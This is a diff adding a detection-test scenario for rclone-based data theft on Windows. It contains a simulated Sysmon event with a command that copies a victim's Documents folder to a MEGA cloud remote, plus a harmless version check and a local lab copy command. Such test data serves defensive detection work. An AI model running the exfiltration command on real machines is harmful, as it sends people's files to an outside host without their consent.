@@ -1,0 +1,12 @@
+scenario: SCE_Exfil_Rclone
+cases:
+  - name: positive_rclone_copy_to_mega
+    expect_incidents: [exfil_rclone]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Users\Public\rclone.exe', Description: Rsync for cloud storage, CommandLine: 'rclone.exe copy C:\Users\victim\Documents mega:backup --transfers 16 --ignore-existing', ParentImage: 'C:\Windows\System32\cmd.exe'}
+  - name: negative_rclone_version
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Tools\rclone.exe', Description: Rsync for cloud storage, CommandLine: 'rclone.exe version', ParentImage: 'C:\Windows\System32\cmd.exe'}
+lab:
+  - 'rclone.exe copy C:\Windows\win.ini ftp:lab --ftp-host 127.0.0.1 --transfers 1 --contimeout 2s'
